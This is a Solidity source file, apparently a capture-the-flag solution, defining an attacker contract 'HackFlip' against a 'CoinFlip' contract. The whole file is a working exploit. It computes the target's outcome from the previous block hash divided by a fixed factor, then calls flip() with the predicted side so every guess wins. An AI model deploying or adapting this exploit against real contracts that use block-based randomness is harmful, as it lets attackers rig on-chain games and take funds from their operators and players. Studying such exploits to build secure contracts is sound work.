pragma solidity ^0.4.18;

interface CoinFlip {
  function flip(bool _guess) public returns (bool);
}

contract HackFlip {
  uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address public flipper;

  function HackFlip(address _flipper) public {
      flipper = _flipper;
  }

  function hackFlip() public {
    uint256 blockValue = uint256(block.blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    CoinFlip(flipper).flip(side);
  }
}